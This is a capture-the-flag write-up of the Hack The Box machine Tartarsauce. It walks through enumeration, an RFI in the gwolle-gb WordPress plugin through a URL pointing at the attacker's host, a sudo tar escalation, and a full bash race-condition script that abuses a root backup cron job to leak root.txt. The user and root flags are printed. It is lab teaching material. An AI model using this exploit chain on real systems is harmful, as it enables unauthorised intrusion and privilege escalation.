# Tartarsauce
>Author : Xyan1d3
>Date : 6th July 2021
>IP : 10.10.10.88
>OS : Linux
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Tue Jul  6 00:22:45 2021 as: nmap -sC -sV -oN nmap/tartarsauce -v 10.10.10.88
Nmap scan report for tartarsauce.htb (10.10.10.88)
Host is up (0.079s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page
```

## Gobuster on `http://10.10.10.88/webservices/`
```
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/tartarsauce]
└──╼ # gobuster dir -u http://10.10.10.88/webservices/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.88/webservices/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/06 02:15:58 Starting gobuster in directory enumeration mode
===============================================================
/wp                   (Status: 301) [Size: 319] [--> http://10.10.10.88/webservices/wp/]
```

## Web Enumeration
We could check the `/webservices/wp` directory and find out that it is running `wordpress`.
Here, We may use `wpscan` to enumerate plugins but, `wpscan` does not work nicely for me. So, Here I will be using `/usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt` a `Seclists` wordlist for wordpress plugin enumeration.

```
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/tartarsauce]
└──╼ # gobuster dir -u http://10.10.10.88/webservices/wp/ -w /usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.88/webservices/wp/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/06 02:13:00 Starting gobuster in directory enumeration mode
===============================================================
/wp-content/plugins/akismet/ (Status: 200) [Size: 0]
/wp-content/plugins/gwolle-gb/ (Status: 200) [Size: 0]
/wp-content/plugins/hello.php (Status: 500) [Size: 0] 
/wp-content/plugins/hello.php/ (Status: 500) [Size: 0]
                                                      
===============================================================
2021/07/06 02:14:47 Finished
===============================================================
```

Here, We find out that it has `gwolle-gb` installed which happens to have an `RFI` vulnerability.


# Initial FootHold as www-data
On visiting `http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.18/`, We find out that it is trying to fetch a file called `wp-load.php` from our box.
![[Pasted image 20210706022144.png]]

We would have to create a malicious file containing a reverse shell to set a shell onto the box.

We get a shell on the box as `www-data`.
![[Pasted image 20210706022351.png]]

# User Escalation to onuma
We do a simple `sudo -l` and find out that we have a sudo nopasswd authorization to run a tar command.
A simple `GTFObins` visit is all it takes to escalate our privileges.
![[Pasted image 20210706022704.png]]

We now get escalated to `onuma` user.
![[Pasted image 20210706022822.png]]

## Getting user Flag
```python
onuma@TartarSauce:~$ ls -l
total 4
lrwxrwxrwx 1 root  root   9 Feb 17  2018 shadow_bkp -> /dev/null
-r-------- 1 onuma onuma 33 Feb  9  2018 user.txt
onuma@TartarSauce:~$ cat user.txt 
b2d6ec45472467c836f253bd170182c7
```

# Root Escalation
For, Root Escalation we have to run `pspy` to find out that cron is running a `/usr/sbin/backuper` every minute or so.
We check it and it turns out that it is a bash script.
```bash
onuma@TartarSauce:/var/backups$ cat /usr/sbin/backuperer
#!/bin/bash
#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ       
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again. 
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------
# Set Vars Here                           
basedir=/var/www/html                     
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt     
errormsg=$bkpdir/onuma_backup_error.txt   
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check
# formatting                              
printbdr()                                
{                                         
    for n in $(seq 72);                   
    do /usr/bin/printf $"-";              
    done                                  
}                                         
bdr=$(printbdr)                           

# Added a test file to let us see when the last backup was run                      
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.                 
/bin/rm -rf $tmpdir/.* $check             

# Backup onuma website dev files.         
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.              
/bin/sleep 30

# Test the backup integrity               
integrity_chk()                           
{                                         
    /usr/bin/diff -r $basedir $check$basedir                                        
}                                         

/bin/mkdir $check                         
/bin/tar -zxvf $tmpfile -C $check         
if [[ $(integrity_chk) ]]                 
then                                      
    # Report errors so the dev can investigate the issue.                           
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg            
    exit 2                                
else                                      
    # Clean up and save archive to the bkpdir.                                      
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak                                      
    /bin/rm -rf $check .*                 
    exit 0                                
fi
```

This script creates a tar archive of the `/var/www/html` and places it on the `/var/tmp` with ownership of `onuma` user. Then, Waits for 30 seconds and then unarchives the tar file and diffs with the original contents of `/var/www/html`. If it has some errors it logs it into `/var/backups/onuma_backup_error.log`.

So, To exploit it we need two shells on the box.
One shell to run `watch -n 1 ls -la '/var/tmp/'` to watch when the new file is created.
And, another shell to fire of this bash script written by me to replace the `/var/www/html/robots.txt` with a symlink to `/root/root.txt`. As a result when the diff occurs next time it logs an error and puts the root flag on the `/var/backups/onuma_backup_errors.log`.

The bash exploit script:
```bash
#!/bin/bash
while true 
do
tarfile=$(ls -la /var/tmp/ |grep onuma|awk '{print $9}');
if test -z "$tarfile" 
then
        echo "\$tarfile is empty";
        continue;
else
      echo "\$tarfile is NOT empty";
fi
echo "[+] Found File "$tarfile;
tarpath=/var/tmp/$tarfile;
echo "[+] Found File Path "$tarpath;
tar xzf $tarpath --directory /var/tmp/;
echo "[+] Extracted "$tarfile" : "$(ls -la /var/tmp|grep onuma)
rm -rf $tarpath;
echo "[+] Removed "$tarpath" : "$(ls -la /var/tmp|grep onuma)
echo "[+] Removing /var/tmp/var/www/html/robots.txt : "$(ls -la /var/tmp/var/www/html/robots.txt)
rm /var/tmp/var/www/html/robots.txt;
echo "[+] Removed /var/tmp/var/www/html/robots.txt : "$(ls -la /var/tmp/var/www/html/robots.txt)
ln -s /root/root.txt /var/tmp/var/www/html/robots.txt;
echo "[+] Created /root/root.txt symlink : " $(ls -la /var/tmp/var/www/html/)
cd /var/tmp;tar -cvzf $tarpath var/www/html/
echo "[+] Created the tar archive : "$tarpath
exit 0
done;
```

The bash exploit should be fired off after the file is created by cron as it takes about `5 seconds` to create the complete archive.
![[Pasted image 20210706154031.png]]
The size should be nearly this much when we need to fire off this bash exploit.

```python
onuma@TartarSauce:/var/tmp$ bash automate.sh
$tarfile is NOT empty
[+] Found File .bd65235b91c39a8f1ac88b24927f3e7d2431e103
[+] Found File Path /var/tmp/.bd65235b91c39a8f1ac88b24927f3e7d2431e103
[+] Extracted .bd65235b91c39a8f1ac88b24927f3e7d2431e103 : -rw-r--r-- 1 onuma onuma 11511673 Jul 6 05:54 .bd65235b91c39a8f1ac88b24927f3e7d2431e103 drwxr-xr-x 3 onuma onuma 4096 Jul 6 05:54 var
[+] Removed /var/tmp/.bd65235b91c39a8f1ac88b24927f3e7d2431e103 : drwxr-xr-x 3 onuma onuma 4096 Jul 6 05:54 var
[+] Removing /var/tmp/var/www/html/robots.txt : -rw-r--r-- 1 onuma onuma 208 Feb 21 2018 /var/tmp/var/www/html/robots.txt
ls: cannot access '/var/tmp/var/www/html/robots.txt': No such file or directory
[+] Removed /var/tmp/var/www/html/robots.txt :
[+] Created /root/root.txt symlink :  total 24 drwxr-xr-x 3 onuma onuma 4096 Jul 6 05:54 . drwxr-xr-x 3 onuma onuma 4096 Jul 6 05:54 .. -rw-r--r-- 1 onuma onuma 10766 Feb 21 2018 index.html lrwxrwxrwx 1 onuma onuma 14 Jul 6 05:54 robots.txt -> /root/root.txt drwxr-xr-x 4 onuma onuma 4096 Feb 21 2018 webservices
var/www/html/
var/www/html/robots.txt
var/www/html/index.html
tar: Exiting with failure status due to previous errors
[+] Created the tar archive : /var/tmp/.bd65235b91c39a8f1ac88b24927f3e7d2431e103
```

## Getting root Flag
```python
onuma@TartarSauce:/var/backups$ tail -n 10 onuma_backup_error.txt 
< User-agent: *
< Disallow: /webservices/tar/tar/source/
< Disallow: /webservices/monstra-3.0.4/
< Disallow: /webservices/easy-file-uploader/
< Disallow: /webservices/developmental/
< Disallow: /webservices/phpmyadmin/
< 
---
> e79abdab8b8a4b64f8579a10b2cd09f9
Only in /var/www/html/webservices/monstra-3.0.4/public/uploads: .empty
```